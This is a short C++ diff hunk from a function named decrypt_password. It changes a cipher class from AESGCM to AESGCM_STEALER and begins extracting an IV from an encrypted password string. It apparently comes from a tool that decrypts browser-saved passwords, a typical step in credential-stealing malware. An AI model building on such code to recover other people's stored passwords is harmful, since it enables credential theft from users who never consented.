@@ -69,7 +69,7 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     {
         key_256[i] = key[i];
     }*/
-    auto cipher = new AESGCM(key);
+    auto cipher = new AESGCM_STEALER(key);
     std::string iv_string = encrypted_pass.substr(3,12);
     std::vector<uint8_t> iv_vec(iv_string.begin(), iv_string.end());
     BYTE *iv = &iv_vec[0];
